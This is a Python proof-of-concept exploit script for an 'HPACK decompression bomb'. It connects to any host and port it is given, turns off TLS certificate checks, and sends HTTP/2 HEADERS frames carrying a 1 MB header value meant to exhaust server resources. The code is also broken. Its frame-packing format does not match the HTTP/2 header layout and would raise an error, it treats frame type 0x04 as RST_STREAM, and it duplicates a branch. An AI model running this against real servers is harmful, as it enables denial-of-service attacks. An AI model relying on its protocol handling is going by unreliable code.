#!/usr/bin/env python3
import socket
import ssl
import struct
import sys
import hpack

def create_h2_frame(frame_type, flags, stream_id, payload):
    """Construct a raw HTTP/2 frame."""
    length = len(payload)
    frame = struct.pack('!IHB', length, frame_type, flags, stream_id)
    return frame + payload

def send_http2_connection_preface(sock):
    """Send the HTTP/2 connection preface."""
    preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    sock.sendall(preface)

def exploit_hpack_decompression_bomb(host, port, use_tls=True):
    """
    Sends a small HPACK-encoded header block that decompresses into a large payload.
    This tests if the server enforces limits on the uncompressed field block size.
    """
    print(f"[*] Connecting to {host}:{port}...")
    
    # Create socket connection
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if use_tls:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=host)
    
    try:
        sock.connect((host, port))
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return

    print("[*] Sending HTTP/2 Connection Preface...")
    send_http2_connection_preface(sock)

    # Create HPACK encoder
    encoder = hpack.Encoder()
    
    # Craft headers that will decompress to a large size
    # We'll use a large value for a custom header to trigger the bomb
    large_value = 'A' * 1000000  # 1MB uncompressed value
    headers = [
        (':method', 'GET'),
        (':path', '/'),
        (':scheme', 'https' if use_tls else 'http'),
        (':authority', host),
        ('x-large-header', large_value)
    ]
    
    print(f"[*] Encoding headers with large value ({len(large_value)} bytes uncompressed)...")
    compressed_headers = encoder.encode(headers)
    print(f"[*] Compressed size: {len(compressed_headers)} bytes")
    
    # Construct HEADERS frame
    # Flags: 0x04 = END_HEADERS
    headers_frame = create_h2_frame(
        frame_type=0x01,  # HEADERS frame type
        flags=0x04,       # END_HEADERS flag
        stream_id=1,      # Stream 1
        payload=compressed_headers
    )
    
    print("[*] Sending crafted HEADERS frame...")
    sock.sendall(headers_frame)
    
    # Wait for response
    print("[*] Waiting for server response...")
    try:
        sock.settimeout(5)
        response = b''
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
            if len(response) > 1000:  # Stop after receiving some data
                break
        
        print(f"[*] Received {len(response)} bytes from server")
        
        # Parse the first frame to check for errors
        if len(response) >= 9:
            length, frame_type, flags, stream_id = struct.unpack('!IHB', response[:9])
            print(f"[*] Response frame type: {frame_type}, length: {length}")
            
            if frame_type == 0x04:  # RST_STREAM
                error_code = struct.unpack('!I', response[9:13])[0]
                print(f"[!] Server sent RST_STREAM with error code: {error_code}")
                if error_code == 0x09:  # COMPRESSION_ERROR
                    print("[+] Server correctly rejected the decompression bomb with COMPRESSION_ERROR")
                elif error_code == 0x01:  # PROTOCOL_ERROR
                    print("[+] Server correctly rejected the decompression bomb with PROTOCOL_ERROR")
                else:
                    print("[?] Server sent RST_STREAM but with unexpected error code")
            elif frame_type == 0x00:  # DATA frame
                print("[+] Server processed the request (potentially vulnerable)")
            elif frame_type == 0x04:  # RST_STREAM
                print("[+] Server sent RST_STREAM")
            else:
                print(f"[?] Server sent unexpected frame type: {frame_type}")
        else:
            print("[?] No valid response received")
            
    except socket.timeout:
        print("[!] Connection timed out - server may be processing the large headers")
    except Exception as e:
        print(f"[!] Error receiving response: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python poc_hpack_decompression_bomb.py <host> <port> [--no-tls]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    use_tls = "--no-tls" not in sys.argv
    
    exploit_hpack_decompression_bomb(host, port, use_tls)